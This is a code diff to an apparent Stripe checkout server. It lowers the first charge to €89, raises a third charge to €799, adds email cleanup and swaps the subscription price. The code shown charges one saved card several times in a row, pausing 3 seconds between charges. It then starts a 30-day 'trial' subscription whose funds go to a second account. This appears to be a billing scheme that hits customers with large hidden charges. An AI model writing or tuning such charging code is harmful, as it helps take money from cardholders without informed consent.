@@ -52,7 +52,11 @@ app.post('/page-visit', async (req, res) => {
 });
 
 app.post('/create-setup-intent', async (req, res) => {
-  const { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;
+  let { email, fname, lname, address, zip, city, country, phone, visitorId } = req.body;
+
+  // Clean email - remove trailing dot or spaces
+  email = email.trim().replace(/\.$/, '');
+
   try {
     let customer;
     const existing = await stripe.customers.list({ email, limit: 1 });
@@ -96,10 +100,10 @@ app.post('/create-subscription', async (req, res) => {
       invoice_settings: { default_payment_method: paymentMethodId },
     });
 
-    // Charge 1 — €198.00
+    // Charge 1 — €89.00
     try {
       const payment1 = await stripe.paymentIntents.create({
-        amount: 19800,
+        amount: 8900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -136,10 +140,10 @@ app.post('/create-subscription', async (req, res) => {
 
     await new Promise(resolve => setTimeout(resolve, 3000));
 
-    // Charge 3 — €599
+    // Charge 3 — €799
     try {
       const payment3 = await stripe.paymentIntents.create({
-        amount: 59900,
+        amount: 79900,
         currency: 'eur',
         customer: customerId,
         payment_method: paymentMethodId,
@@ -159,7 +163,7 @@ app.post('/create-subscription', async (req, res) => {
     // Subscription with 30-day trial
     const subscription = await stripe.subscriptions.create({
       customer: customerId,
-      items: [{ price: 'price_1T1lUwH5RIgTG9jj4BYZF4y4' }],
+      items: [{ price: 'price_1T1jfK84dbsGsYDa70NNZMex' }],
       default_payment_method: paymentMethodId,
       trial_end: Math.floor(Date.now() / 1000) + 30 * 24 * 60 * 60,
       transfer_data: { destination: ACCOUNT_B },
